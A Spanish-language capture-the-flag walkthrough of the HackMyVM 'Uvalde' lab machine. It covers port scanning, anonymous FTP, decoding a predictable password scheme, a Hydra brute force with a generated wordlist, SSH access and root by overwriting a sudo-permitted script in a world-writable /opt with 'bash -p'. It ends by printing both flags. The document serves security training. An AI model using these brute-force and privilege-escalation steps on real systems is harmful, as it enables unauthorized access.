---
icon: flag
---

# Uvalde HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-18 03:11 EDT
Nmap scan report for 192.168.5.23
Host is up (0.0013s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000         5154 Jan 28  2023 output
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.5.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 3a:09:a4:da:d7:db:99:ee:a5:51:05:e9:af:e7:08:90 (RSA)
|   256 cb:42:6a:be:22:13:2c:f2:57:f9:80:d1:f7:fb:88:5c (ECDSA)
|_  256 44:3c:b4:0f:aa:c3:94:fa:23:15:19:e3:e5:18:56:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Agency - Start Bootstrap Theme
|_http-server-header: Apache/2.4.54 (Debian)
MAC Address: 08:00:27:B4:40:7B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.82 seconds
```

Veremos un puerto `FTP` y un puerto `80`, si entramos donde se aloja una pagina web en el puerto `80` veremos una pagina web normal y corriente sin nada interesante, vamos a ver si podemos acceder al `FTP` de forma anonima.

```shell
ftp anonymous@<IP>
```

Veremos que si nos deja y si listamos veremos lo siguiente:

```
229 Entering Extended Passive Mode (|||22504|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        116          4096 Jan 28  2023 .
drwxr-xr-x    2 0        116          4096 Jan 28  2023 ..
-rw-r--r--    1 1000     1000         5154 Jan 28  2023 output
226 Directory send OK.
```

Vamos a descargarnos dicho archivo a ver que continene:

```shell
get output
```

Una vez descargado, vamos a leerlo:

```
Script démarré sur 2023-01-28 19:54:05+01:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="105" LINES="25"]
matthew@debian:~$ id
uid=1000(matthew) gid=1000(matthew) groupes=1000(matthew)
matthew@debian:~$ ls -al
total 32
drwxr-xr-x 4 matthew matthew 4096 28 janv. 19:54 .
drwxr-xr-x 3 root    root    4096 23 janv. 07:52 ..
lrwxrwxrwx 1 root    root       9 23 janv. 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 matthew matthew  220 23 janv. 07:51 .bash_logout
-rw-r--r-- 1 matthew matthew 3526 23 janv. 07:51 .bashrc
drwx------ 3 matthew matthew 4096 23 janv. 08:04 .config
drwxr-xr-x 3 matthew matthew 4096 23 janv. 08:04 .local
-rw-r--r-- 1 matthew matthew  807 23 janv. 07:51 .profile
-rw-r--r-- 1 matthew matthew    0 28 janv. 19:54 typescript
-rwx------ 1 matthew matthew   33 23 janv. 07:53 user.txt
matthew@debian:~$ toilet -f mono12 -F metal hackmyvm.eu
                                                                                
 ▄▄                            ▄▄                                               
 ██                            ██                                               
 ██▄████▄   ▄█████▄   ▄█████▄  ██ ▄██▀   ████▄██▄  ▀██  ███  ██▄  ▄██  ████▄██▄ 
 ██▀   ██   ▀ ▄▄▄██  ██▀    ▀  ██▄██     ██ ██ ██   ██▄ ██    ██  ██   ██ ██ ██ 
 ██    ██  ▄██▀▀▀██  ██        ██▀██▄    ██ ██ ██    ████▀    ▀█▄▄█▀   ██ ██ ██ 
 ██    ██  ██▄▄▄███  ▀██▄▄▄▄█  ██  ▀█▄   ██ ██ ██     ███      ████    ██ ██ ██ 
 ▀▀    ▀▀   ▀▀▀▀ ▀▀    ▀▀▀▀▀   ▀▀   ▀▀▀  ▀▀ ▀▀ ▀▀     ██        ▀▀     ▀▀ ▀▀ ▀▀ 
                                                    ███                         
                                                                                
                                                                                
                                                                                
                                                                                
            ▄████▄   ██    ██                                                   
           ██▄▄▄▄██  ██    ██                                                   
           ██▀▀▀▀▀▀  ██    ██                                                   
    ██     ▀██▄▄▄▄█  ██▄▄▄███                                                   
    ▀▀       ▀▀▀▀▀    ▀▀▀▀ ▀▀                                                   
                                                                                
                                                                                
matthew@debian:~$ exit
exit

Script terminé sur 2023-01-28 19:54:37+01:00 [COMMAND_EXIT_CODE="0"]
```

Vemos que es un `log` del sistema, pero con esto ya estamos identificando un usuario llamado `matthew`, aunque de momento no veremos nada mas interesante, vamos a realizar un poco de `fuzzing` a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.23/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 29604]
/img                  (Status: 200) [Size: 1921]
/login.php            (Status: 200) [Size: 1022]
/user.php             (Status: 200) [Size: 1022]
/mail                 (Status: 200) [Size: 946]
/.html                (Status: 403) [Size: 277]
/js                   (Status: 200) [Size: 1575]
/success.php          (Status: 200) [Size: 1022]
/vendor               (Status: 200) [Size: 1557]
/css                  (Status: 200) [Size: 1139]
/create_account.php   (Status: 200) [Size: 1003]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos varias cosas interesantes, entre ellas este archivo llamado `create_account.php`, vamos a entrar dentro de dicho archivo a ver que nos encontramos.

```
URL = http://<IP>/create_account.php
```

Veremos que nos aparecera una campo en el que tendremos que ingresar nuestro nombre, por lo que vamos a poner `test`, una vez echo esto veremos lo siguiente en la pagina:

```
Successful registration
```

Y en la `URL` veremos esto otro:

```
http://<IP>/success.php?dXNlcm5hbWU9dGVzdCZwYXNzd29yZD10ZXN0MjAyNUA4OTUy
```

Vemos que se nos genera una cadena codificada en `Base64`, vamos a decodificarla de esta forma:

```shell
echo "dXNlcm5hbWU9dGVzdCZwYXNzd29yZD10ZXN0MjAyNUA4OTUy" | base64 -d
```

Info:

```
username=test&password=test2025@8952
```

Vemos que se ingresa el usuario que nosotros metemos y que despues se genera una contraseña por defecto que te genera la pagina web, por lo que podemos deducir que el usuario `matthew` puede tener dicha contraseña por defecto que te da la web siguiendo esta estructura:

```
usuario + año + @ + num_aleatorio
```

Tambien vemos que el `output` esta en el `2023-01-28` por lo que seguramente el año de la cuenta de la password sea con dicho año, vamos a ponarnos un script que nos genere dicha password con los numeros aleatorios, pero con esa estructura y con ese año.

> generate\_dic.py

```python
# Generador de diccionario: matthew2023@0000 - matthew2023@9999

with open("diccionario.txt", "w") as f:
    for i in range(10000):
        palabra = f"matthew2023@{i:04d}"
        f.write(palabra + "\n")

print("Diccionario generado como diccionario.txt")
```

Ahora si ejecutamos esto:

```shell
python3 generate_dic.py
```

Veremos que nos ha generado el diccionario de forma correcta, por lo que vamos a realizar `fuerza bruta` en el archivo de `login.php` mediante `hydra`.

## Escalate user matthew

### Hydra

```shell
hydra -l matthew -P diccionario.txt <IP> http-post-form "/login.php:username=^USER^&password=^PASS^:S=302"
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-18 03:32:56
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries (l:1/p:10000), ~625 tries per task
[DATA] attacking http-post-form://192.168.5.23:80/login.php:username=^USER^&password=^PASS^:S=302
[80][http-post-form] host: 192.168.5.23   login: matthew   password: matthew2023@1554
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-18 03:33:24
```

Veremos que hemos obtenido las credenciales de dicho usuario, ahora si las probamos en el `login.php`, veremos que si nos deja, pero no veremos gran cosa, por lo que vamos a probarlas por `SSH` a ver si funcionan.

### SSH

```shell
ssh matthew@<IP>
```

Metemos como contraseña `matthew2023@1554` y veremos que estamos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
6e4136fbed8f8c691996dbf42697d460
```

## Escalate Privileges

SI hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for matthew on uvalde:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User matthew may run the following commands on uvalde:
    (ALL : ALL) NOPASSWD: /bin/bash /opt/superhack
```

Veremos que podremos ejecutar `bash` junto con el script `superhack` como el usuario `root`, por lo que vamos a investigar dicho script.

Si leemos el script, veremos lo siguiente:

```bash
#! /bin/bash 
clear -x

GRAS=$(tput bold)
JAUNE=$(tput setaf 3)$GRAS
BLANC=$(tput setaf 7)$GRAS
BLEU=$(tput setaf 4)$GRAS
VERT=$(tput setaf 2)$GRAS
ROUGE=$(tput setaf 1)$GRAS
RESET=$(tput sgr0)

cat << EOL


 _______  __   __  _______  _______  ______    __   __  _______  _______  ___   _ 
|       ||  | |  ||       ||       ||    _ |  |  | |  ||   _   ||       ||   | | |
|  _____||  | |  ||    _  ||    ___||   | ||  |  |_|  ||  |_|  ||       ||   |_| |
| |_____ |  |_|  ||   |_| ||   |___ |   |_||_ |       ||       ||       ||      _|
|_____  ||       ||    ___||    ___||    __  ||       ||       ||      _||     |_ 
 _____| ||       ||   |    |   |___ |   |  | ||   _   ||   _   ||     |_ |    _  |
|_______||_______||___|    |_______||___|  |_||__| |__||__| |__||_______||___| |_|



EOL


printf "${BLANC}Tool:${RESET} ${BLEU}superHack${RESET}\n"
printf "${BLANC}Author:${RESET} ${BLEU}hackerman${RESET}\n"
printf "${BLANC}Version:${RESET} ${BLEU}1.0${RESET}\n"

printf "\n"

[[ $# -ne 0 ]] && echo -e "${BLEU}Usage:${RESET} $0 domain" && exit

while [ -z "$domain" ]; do
read -p "${VERT}domain to hack:${RESET} " domain
done

printf "\n"

n=50

string=""
for ((i=0; i<$n; i++))
do
string+="."
done

for ((i=0; i<$n; i++))
do
string="${string/./#}"
printf "${BLANC}Hacking progress...:${RESET} ${BLANC}[$string]${RESET}\r"
sleep .09
done

printf "\n"
printf "${JAUNE}Target $domain ====> PWNED${RESET}\n"
printf "${JAUNE}URL: https://$domain/*********************.php${RESET}\n"

echo -e "\n${ROUGE}Pay 0.000047 BTC to 3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5 to unlock backdoor.${RESET}\n"
```

Pero no veremos nada interesante, ahora si listamos la carpeta `/opt` veremos esto:

```
drwx---rwx  2 root root 4096 Feb  5  2023 .
drwxr-xr-x 18 root root 4096 Jan 22  2023 ..
-rw-r--r--  1 root root 1594 Jan 31  2023 superhack
```

Vemos que el archivo esta dentro del `/opt` con estos permisos:

```
drwx---rwx
```

Por lo que podremos hacer una cosa con dicho archivo:

```shell
mv superhack superhack_old
nano superhack

#Dentro del nano
#!/bin/bash

bash -p
```

Lo guardamos y le establecemos permisos de ejecuccion.

```shell
chmod +x superhack
```

Ahora si lo ejecutamos de esta forma:

```shell
sudo bash /opt/superhack
```

Info:

```
root@uvalde:/opt# whoami
root
```

Veremos que seremos `root` por lo que leeremos la `flag` de `root`.

> root.txt

```
59ec54537e98a53691f33e81500f56da
```
